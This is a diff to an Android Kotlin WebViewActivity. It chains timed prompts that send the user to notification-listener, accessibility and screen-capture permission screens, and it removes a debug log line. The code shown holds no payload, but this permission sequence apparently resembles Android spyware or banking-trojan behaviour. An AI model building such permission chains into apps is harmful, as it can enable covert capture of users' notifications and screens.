@@ -196,12 +196,21 @@ class WebViewActivity : AppCompatActivity() {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (_: Exception) {}
         }
-        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 4000)
+        android.os.Handler(mainLooper).postDelayed({ requestAccessibility() }, 4000)
     }
 
     private fun isNotifAccessGranted(): Boolean {
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat != null && flat.contains(packageName)
+    }
+
+    private fun requestAccessibility() {
+        if (!AccessibilityHelper.isEnabled(this)) {
+            try {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+            } catch (_: Exception) {}
+        }
+        android.os.Handler(mainLooper).postDelayed({ requestScreenCapture() }, 5000)
     }
 
     private fun requestScreenCapture() {
@@ -214,8 +223,7 @@ class WebViewActivity : AppCompatActivity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SCREEN_REQUEST_CODE) {
-            val ok = ScreenCapture.onPermissionResult(this, resultCode, data)
-            android.util.Log.d("WebViewActivity", "Screen capture permission result: $ok")
+            ScreenCapture.onPermissionResult(this, resultCode, data)
         }
     }
 
